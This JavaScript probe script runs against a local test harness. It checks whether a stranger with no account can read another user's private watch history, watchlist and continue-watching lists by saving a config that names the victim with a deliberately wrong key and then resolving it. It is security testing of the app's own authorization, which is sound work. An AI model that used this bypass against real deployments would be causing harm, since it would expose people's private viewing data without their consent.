// Probe: can an unauthenticated stranger read another account's Watch History,
// Continue Watching, Watchlist and Airing Next, knowing only the username?
import { makeEnv, makeKv, makeD1, call, createUser } from "../../tests/harness.mjs";
const env = makeEnv({ CONFIGS: makeKv(), DB: makeD1() });

// --- victim sets up an account and records some private watch history ---
const victim = await createUser(env, "victimuser");
await call(env, "/api/creator/sync/save-tracking", { method: "POST", json: {
  creatorName: "victimuser", creatorKey: victim.creatorKey,
  watchHistory: [{ id: "tt7654321:1:1", showId: "tt7654321", showTitle: "A Private Show", seasonNum: 1, episodeNum: 1, watchedAt: 111 }],
  continueWatching: [{ id: "tt7654321:1:2", showId: "tt7654321", name: "Ep 2", showTitle: "A Private Show", seasonNum: 1, episodeNum: 2 }],
  watchlist: [{ id: "tt0000009", name: "Something Embarrassing" }],
  airingNext: [{ id: "tt111", showId: "tt111", showTitle: "Upcoming", airDate: "2026-12-01" }],
}});

// --- attacker: no account, no key. Mints their OWN install config that
//     merely NAMES the victim, then asks the Worker to resolve it. ---
const save = await call(env, "/api/save", { method: "POST", json: {
  entries: [{ id: "x", name: "x", type: "series", url: "autotrack:watch-history:series:victimuser" }],
  track: true,
  trackCreatorName: "victimuser",
  trackCreatorKey: "MYL-NOPE-NOPE-NOPE",     // deliberately wrong
}});
console.log("attacker /api/save ->", save.status, JSON.stringify(save.body));

const leak = await call(env, "/api/resolve?config=" + encodeURIComponent(save.body.id));
console.log("attacker /api/resolve ->", leak.status);
const b = leak.body;
console.log("  watchHistory   :", JSON.stringify(b.watchHistory));
console.log("  continueWatching:", JSON.stringify(b.continueWatching));
console.log("  watchlist      :", JSON.stringify(b.watchlist));
console.log("  airingNext     :", JSON.stringify(b.airingNext));
